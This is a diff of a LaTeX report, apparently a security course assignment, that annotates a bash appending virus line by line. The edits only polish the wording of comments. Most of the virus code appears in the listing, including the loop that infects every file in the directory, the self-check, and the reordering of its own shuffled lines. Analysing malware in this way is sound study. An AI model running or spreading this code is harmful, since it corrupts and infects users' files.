@@ -62,8 +62,8 @@ The bash code given as assignment is a appending virus that copies his own code 
 Below we explain in detail the virus behavior.
 
 \begin{lstlisting}
-if [ "$1" == "test" ]; then  #@1// If the first parameter is equals to "test" exit and 
-  exit 0  #@2				// return 0 because the file is already infected
+if [ "$1" == "test" ]; then  #@1// If the first parameter is equals to "test" exit 
+  exit 0  #@2				// with exit status 0 because the file is already infected
 fi  #@3
 MANAGER=(test cd ls pwd)  #@4 // Array of 4 elements, used as temporary file names
 RANDOM=$$  #@5 // Reseed the random number generator using virus process ID
@@ -71,7 +71,6 @@ for target in *; do  #@6	// For each file in the directory
 	nbline=$(wc -l $target)  #@7		// Count the number of the target file					
 	nbline=${nbline##}  #@8	// Trim the left side of the string
 	nbline=$(echo $nbline | cut -d " " -f1)  #@9 // and retrives the number of lines
-	nbline=$(echo $nbline | cut -d " " -f1) #@9 		// and retrive the number of lines
   
 	// Checks if the chosen file has less number of lines of the virus. 
 	// If it is true continue with another file
@@ -83,7 +82,7 @@ for target in *; do  #@6	// For each file in the directory
 	// Takes the last 36 lines of target and sort them with ordering based on the number after @.
 	// It restores the code in the original order and writes the output in an hidden temporary file. (name chosen in the previous line)
 	tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@14
-	// Gives to /tmp/\ /"$NEWFILE"  the execution permission and execute it redirecting stderr to /dev/null
+	// Gives to /tmp/."$NEWFILE"  the execution permission and execute it redirecting stderr to /dev/null
 	chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@15
   // Checks the exit code of the last command executed: if it correspond to the virus it returns 0 (see first 3 lines) and continue, because the file is already infected. 
   if [ "$?" == "0" ]; then  #@16
@@ -93,7 +92,7 @@ for target in *; do  #@6	// For each file in the directory
   NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
 	// Path of the just created file								
   NEWFILE="/tmp/.$NEWFILE"  #@20
-	// Appends to the target file the nexts 3 lines of code that will be executed  when the target file will be run: this lines gets the last 36 lines of target (the virus) and executes it in background: there three lines are used for the infection phase; re-order the last 36 lines of the infected file and execute them.
+	// Appends to the target file the nexts 3 lines of code that will be executed  when the target file will be run: these lines gets the last 36 lines of target (the virus) and executes it in background: there three lines are used for the infection phase; re-order the last 36 lines of the infected file and execute them.
   echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@21
   echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
   echo "exit 0" >> $target  #@23
@@ -107,7 +106,7 @@ for target in *; do  #@6	// For each file in the directory
     while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
       valindex=$(((RANDOM % 36) + 1))  #@29
     done  #@30
-		// Takes the last (n - valindex)-line of the virus					
+		// Takes the last (n minus valindex)-line of the virus					
     line=$(tail -n $valindex $0 | head -1)  #@31
     // Appends the line to the target file
     echo -e "$line" >> $target  #@32
